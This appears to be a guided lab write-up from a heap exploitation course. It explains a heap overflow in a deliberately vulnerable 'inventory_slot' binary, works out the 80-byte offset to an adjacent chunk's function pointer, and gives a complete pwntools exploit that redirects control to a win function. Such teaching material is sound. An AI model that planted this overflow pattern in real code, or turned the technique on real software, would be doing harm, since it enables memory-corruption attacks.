### Inventory Slot - Heap Overflow

> x Exam (56)


The second guided example introduces the **heap overflow** primitive, demonstrating how a write that exceeds a buffer's declared size can corrupt the contents of the physically adjacent chunk and redirect control flow through a function pointer stored there. The challenge is located in `01_inventory_slot/`, with the binary at `01_inventory_slot/inventory_slot`, the source at `01_inventory_slot/main.c`, and the pinned glibc 2.39 `libc.so.6` and `ld-linux-x86-64.so.2` present alongside.

The program performs two consecutive heap allocations and then reads user input:

```c
char *note      = malloc(64);           /* plain buffer, 64 B user data  */
struct Slot *slot = malloc(sizeof *slot); /* contains function pointer    */
slot->display   = default_display;
read(0, note, 0xC0);                    /* OVERFLOW: 192 B into 64 B buf */
```

The `Slot` struct's first field is the function pointer `display`. The declared size of `note` is 64 bytes (`0x40`), but `read` is permitted to write up to `0xC0` (192) bytes into it, silently overflowing 128 bytes past the end of the buffer.

**Step 1: Why the Two Chunks Are Adjacent**

On a clean heap with no prior frees of matching size classes, `malloc` satisfies consecutive allocations by carving sequentially from the **top chunk**, the unused remainder at the top of the heap. Because `note` is allocated first and `slot` immediately after, with no intervening `free` calls that would recycle a tcache entry, both chunks are carved from the top in order and are therefore physically contiguous in memory. This adjacency is not accidental: it is the deterministic behavior of the allocator when the tcache is empty for those size classes, and it is precisely the property the overflow exploits.

**Step 2: Computing the Offset to `slot->display`**

The calculation of `OFFSET_TO_DISPLAY` requires careful accounting of the chunk layout. The `note` buffer occupies 64 bytes (`0x40`) of user data, beginning at the user pointer returned by `malloc`. Immediately following the last byte of `note`'s user data is the start of the `slot` chunk, whose first 16 bytes are the chunk header: 8 bytes of `prev_size` followed by 8 bytes of `size`. The user pointer of the `slot` chunk, and therefore `slot->display`, begins immediately after this 16-byte header.

```
[note user data: 64 B] [slot prev_size: 8 B] [slot size: 8 B] [slot->display: 8 B]
 ^                                                               ^
 note (malloc return)                           OFFSET_TO_DISPLAY = 80 bytes
```

Therefore `OFFSET_TO_DISPLAY = 64 + 8 + 8 = 80` bytes. The payload shape described in the lab document maps directly onto this arithmetic:

```
[ 64 B padding (note) ] [ 8 B fake prev_size ] [ 8 B fake size ] [ 8 B &win ]
```

The fake `prev_size` and fake `size` fields are written into the slot chunk's header, but because `slot` is never freed, the allocator never reinspects these fields, and their corrupted values cause no crash.

**Step 3: Determining WIN**

Running `checksec` on the binary confirms that PIE is disabled, meaning the address of `win` is fixed across all executions and is directly readable from the ELF symbol table via `elf.sym.win`, with no runtime leak required.

**Step 4: The Complete Exploit**

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./inventory_slot', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = conn()

OFFSET_TO_DISPLAY = 80      # 64 B note data + 8 B prev_size + 8 B size
WIN               = elf.sym.win

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

p.sendafter(b'content: ', payload)
print(p.recvall(timeout=1).decode(errors='replace'))
```

The payload is constructed with `flat`, which concatenates its arguments into a single byte string: 80 bytes of padding carry the write cursor past `note`'s user data and through `slot`'s chunk header, placing the subsequent `p64(WIN)` exactly at the offset where `slot->display` resides. When the program subsequently calls `slot->display(slot)`, it dereferences this now-corrupted pointer and transfers control to `win`.

To verify in GDB, a breakpoint placed just before the `slot->display(slot)` call, followed by `x/gx slot` and `malloc_chunk slot`, will confirm that the eight bytes at `slot->display` have been replaced with the address of `win`. If the exploit instead prints garbage, the offset should be rechecked with `x/20gx note` immediately before the call, counting quadwords from the `note` pointer until the corrupted value appears.

> **Key takeaway:** The heap overflow differs from the UAF in one fundamental respect: no `free` is required, and no bin is involved. The vulnerability is purely spatial, a write that extends past the declared boundary of one chunk into the header or payload of the next. The two prerequisites are that the target chunk must be physically adjacent to the overflowing chunk, which is guaranteed by the top-chunk carving behavior on a clean heap, and that the target chunk must contain a value the attacker wishes to control, in this case a function pointer. Together, the two guided examples establish the two foundational heap primitives: temporal confusion through the tcache (UAF) and spatial confusion through adjacency (overflow), upon which all three independent exercises now build.

